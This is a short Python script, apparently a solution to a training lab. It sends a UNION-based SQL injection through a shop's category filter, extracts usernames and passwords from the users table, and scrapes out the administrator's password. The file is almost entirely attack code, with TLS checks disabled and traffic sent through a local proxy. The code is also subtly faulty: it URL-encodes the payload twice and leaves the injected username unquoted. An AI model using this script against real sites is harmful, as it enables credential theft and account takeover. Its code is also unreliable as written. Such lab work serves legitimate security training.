# Lab: SQL injection UNION attack, retrieving data from other tables

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def Request(url, path, query):
    encoded_query = quote(query)
    try:
        r = requests.get(url + path + encoded_query, verify=False, proxies=proxies, timeout=10 )
    except requests.RequestException:
        return None
    return r

def exploit_users_table(url):
    username = "administrator"
    path = "/filter?category=Accessories"
    sql_payload = f"'UNION SELECT username, password from users WHERE username={username} -- "

    encoded_payload = quote(sql_payload)
    r =  Request(url, path, encoded_payload)

    res = r.text
    if username in res:
        print("[+] Found an administrator password")
        soup = BeautifulSoup(res, "html.parser")

        admin_password = soup.body.find(string=username).parent.find_next("td").contents[0]
        print(f"[+] Found an administrator password: {admin_password}")
        return True

    return False


if __name__ == "__main__":
    url = input("Enter the your url: ").strip()

    print("[+] Dumping the list of username and passwords")
    if not exploit_users_table(url):
        print("[-] Did not find an administrator password")
